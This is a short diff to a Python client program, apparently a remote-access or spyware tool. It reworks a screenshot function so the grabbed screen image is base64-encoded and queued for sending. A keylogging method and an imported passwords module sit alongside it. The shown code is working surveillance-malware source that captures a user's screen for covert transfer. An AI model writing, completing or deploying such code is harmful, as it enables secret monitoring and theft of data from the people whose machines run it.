@@ -4,6 +4,7 @@ import sys
 import threading, time
 from Queue import Queue
 import passwords
+import base64
 from PIL import ImageGrab
 
 def signal_handler(signal, frame):
@@ -59,12 +60,13 @@ class Client:
 
     def screenshot(self):
         #TODO: Fill this in
-        # pyscreenshot.grab_to_file('C:\Users\Matt\Desktop\scrnsht.jpg')
-        ImageGrab.grab().save("C:\Users\Matt\Desktop\scrnsht.jpg", "JPEG")
-        f = open('C:\Users\matt\Desktop\scrnsht.jpg', 'rb')
+        ImageGrab.grab().save("C:\Users\Matt\Desktop\scrnsht.png", "PNG")
+        # img = ImageGrab.grab()
+        f = open('C:\Users\matt\Desktop\scrnsht.png', 'rb')
         fread = f.read()
-        size = str(len(fread))
-        data = fread
+        imgstr = base64.b64encode(fread)
+        size = str(len(imgstr))
+        data = imgstr
         self.enqueue(size,data)
 
     def keylog(self):
